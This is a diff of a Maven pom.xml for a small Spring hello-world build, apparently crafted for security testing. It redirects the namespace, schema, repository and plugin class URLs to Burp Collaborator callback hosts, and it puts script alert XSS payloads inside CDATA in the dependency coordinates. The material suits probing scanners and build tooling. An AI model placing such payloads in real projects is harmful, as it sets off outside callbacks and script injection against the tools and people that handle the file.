@@ -1,6 +1,6 @@
 <?xml version="1.0" encoding="UTF-8"?>
-<project xmlns="http://maven.apache.org/POM/4.0.0" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
-	xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 https://maven.apache.org/xsd/maven-4.0.0.xsd">
+<project xmlns="http://alpha.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net" xmlns:xsi="http://bravo.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net"
+    xsi:schemaLocation="http://charlie.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net"/>
 	<modelVersion>4.0.0</modelVersion>
 	
 	<groupId>org.springframework</groupId>
@@ -16,16 +16,25 @@
 <repositories>
    <repository>
        <id>org.source.repo</id>
-       <url>http://v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
+       <url>http://delta.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/</url>
    </repository>
 </repositories>
 
 	<dependencies>
 		<!-- tag::bad stuff[] -->
 		<dependency>
-			<groupId>trustedsec</groupId>
-			<artifactId>trustedsec</artifactId>
-			<version>1.3.3.7</version>
+			<groupId>trustedsec<![CDATA[rn
+                <script language="Javascript" type="text/javascript">alert ("alpha")</script>rn
+            ]]>
+            </groupId>
+			<artifactId>trustedsec<![CDATA[rn
+                <script language="Javascript" type="text/javascript">alert ("bravo")</script>rn
+            ]]>
+            </artifactId>
+			<version>1.3.3.7<![CDATA[rn
+                <script language="Javascript" type="text/javascript">alert ("charlie")</script>rn
+            ]]>
+            </version>
 		</dependency>
 		<!-- tag::joda[] -->
 		<dependency>
@@ -58,7 +67,7 @@
 						</goals>
 						<configuration>
 							<transformers>
-								<transformer implementation="org.apache.maven.plugins.shade.resource.ManifestResourceTransformer">
+								<transformer implementation="http://echo.v84lewqexklqy6597cm77vco0f65uu.burpcollaborator.net/">
 									<mainClass>hello.HelloWorld</mainClass>
 								</transformer>
 							</transformers>
